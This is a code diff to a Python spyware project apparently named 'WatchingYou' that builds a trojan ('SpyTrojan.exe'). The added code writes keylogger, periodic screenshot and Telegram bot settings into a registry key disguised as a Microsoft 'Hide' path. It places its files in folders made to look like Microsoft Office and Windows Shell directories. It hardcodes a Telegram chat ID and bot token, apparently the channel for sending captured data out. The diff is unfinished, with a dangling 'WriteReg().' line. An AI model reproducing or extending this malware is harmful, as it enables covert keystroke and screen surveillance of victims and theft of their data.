@@ -17,6 +17,19 @@ import eel # Entorno gráfico con HTML/ CSS / JS
 from shutil import rmtree  # Remove foldes with files
 from PIL import ImageGrab  # Take Screenshot
 
+import configparser
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'   # ignore class
+
 
 class WinRegistry:
     def __init__(self, path):
@@ -668,6 +681,71 @@ class WebCam_IA:
         init(num)
 
 
+class WriteReg:
+    class Keylogger:
+        def __init__(self, pathReg, active, limit):
+            self.__path = pathReg
+            self.active = active
+            self.limit = limit
+
+        def set_values(self):
+            reg = WinRegistry(self.__path)
+            reg.set_value_DWORD('active', self.active)
+            reg.set_value_DWORD('limit', self.limit)
+            print(
+                f"{bcolors.BOLD}{bcolors.OKBLUE}Keylogger: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
+
+    class Screenshot:
+        def __init__(self, pathReg, active, intervalSeconds, cache_path):
+            self.__path = pathReg
+            self.value_active = active
+            self.intervalSeconds = intervalSeconds
+            self.cache_path = cache_path
+
+        def set_values(self):
+            reg = WinRegistry(self.__path)
+            reg.set_value_DWORD('active', self.value_active)
+            reg.set_value_DWORD('interval_seconds', self.intervalSeconds)
+            reg.set_value_ExpandableString('path', self.cache_path)
+            print(
+                f"{bcolors.BOLD}{bcolors.OKBLUE}Screenshot: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
+
+    class TelegramBot:
+        def __init__(self, path_registry, id, token):
+            self.__path = path_registry
+            self.id = id  # Array # Saltos de linea
+            self.token = token
+
+        def set_values(self):
+            reg = WinRegistry(self.__path)
+            reg.set_value_MultiString('id', self.id)
+            reg.set_value_String('token', self.token)
+            print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
+                  f"TelegramBot: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
+
+    class Trojan:
+        def __init__(self, path_registry, debug, delay, path_software, name_software, username):
+            self.__path_registry = path_registry
+            self.__debug = debug  # not enabled this version
+            self.__delay = delay  # not enable this version
+            self.__path_software = path_software
+            self.__name_software = name_software
+            self.__path_complete = self.__path_software + '\\' + self.__name_software
+            self.__user = username
+
+        def set_values(self):
+            reg = WinRegistry(self.__path_registry)
+            reg.set_value_DWORD('debug', self.__debug)
+            reg.set_value_DWORD('delay', self.__delay)
+            reg.set_value_ExpandableString('sub_path', self.__path_software)
+            reg.set_value_ExpandableString('name_software', self.__name_software)
+            reg.set_value_ExpandableString('path', self.__path_complete)
+            reg.set_value_String('username', self.__user)
+
+            print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
+                  f"Trojan: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
+
+
 class WatchingYou:
     def write_reg_init(self):
         if self.__check_reg() == False:
@@ -693,12 +771,52 @@ class WatchingYou:
     def __write_id(self, fullname, chat_id):
         WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').set_value_String('fullname', fullname)
         WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').set_value_MultiString('id',chat_id)
+    def write_reg_complete_init(self):
+
+        WriteReg().Keylogger(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger',
+                  active=1,
+                  limit=150
+                  ).set_values()
+        WriteReg().Screenshot(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot',
+                   active=1,
+                   intervalSeconds=15,
+                   cache_path='C:\\Users\\' + str(
+                       os.getlogin()) + r'\AppData\Local\Microsoft\Office\16.0\Floodgate\temp'
+                   ).set_values()
+        WriteReg().TelegramBot(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot',
+                    id=["-1001322369309"],
+                    token="1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM",
+                    ).set_values()
+        WriteReg().Trojan(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide',
+                        debug=0,
+                        delay=0,
+                        path_software='C:\\Users\\' + str(
+                            os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp',
+                        name_software='SpyTrojan.exe',
+                        username=str(os.getlogin())
+                        )
 
     def active(self):
-        pass
+        WriteReg().
 
     def desactive(self):
         pass
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 if __name__ == '__main__':
